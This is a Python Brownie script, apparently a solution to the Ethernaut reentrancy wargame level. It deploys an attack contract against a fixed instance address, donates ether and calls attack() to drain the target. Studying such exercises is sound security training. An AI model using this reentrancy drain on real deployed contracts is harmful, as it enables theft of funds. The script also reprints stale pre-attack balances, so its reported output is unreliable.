from scripts.helpful_scripts import get_account
from brownie import web3, Attack10, interface

ETHERNAUT_INSTANCE = "0x58C7cdda21c43803DcFE82CE7E41926816df7bb9"
AMOUNT = "0.01 ether"
GAS_LIMIT = 600000


def main():

    player = get_account()

    # set target (interface address)
    target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)
    eth_balance_target = web3.fromWei(target.balance(), "ether")

    # deploy attack contract
    attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})
    eth_balance_attack = web3.fromWei(attack.balance(), "ether")
    print(f"\nBalance of the target contract = {eth_balance_target} ether")

    # donate ether to the target contract
    target.donate(attack.address, {"from": player, "value": AMOUNT})

    # call the attack() function, on my attack contract
    print(f"Calling attack() from {attack} ")
    # attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})
    attack.attack({"from": player, "gas_limit": GAS_LIMIT})

    print(f"\nBalance of the target contract = {eth_balance_target} ether")
    print(f"\nBalance of the attack contract = {eth_balance_attack} ether\n")

    # ####  could print all of these values to a log file?
